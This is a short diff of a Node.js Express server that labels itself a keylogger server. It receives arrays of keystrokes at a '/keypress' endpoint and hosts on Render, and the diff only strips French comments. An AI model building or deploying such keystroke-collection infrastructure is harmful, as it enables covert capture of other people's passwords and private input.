@@ -6,12 +6,10 @@ const app = express();
 app.use(bodyParser.json());
 app.use(cors());
 
-// Route GET obligatoire pour Render
 app.get('/', (req, res) => {
     res.send("Keylogger server OK");
 });
 
-// Route qui reçoit un tableau de touches
 app.post('/keypress', (req, res) => {
     const { keys } = req.body;
 
@@ -24,7 +22,6 @@ app.post('/keypress', (req, res) => {
     res.status(200).send({ message: 'Touches reçues', count: keys.length });
 });
 
-// Lancement du serveur
 const port = process.env.PORT || 3000;
 app.listen(port, () => {
     console.log(`Server running on port ${port}`);
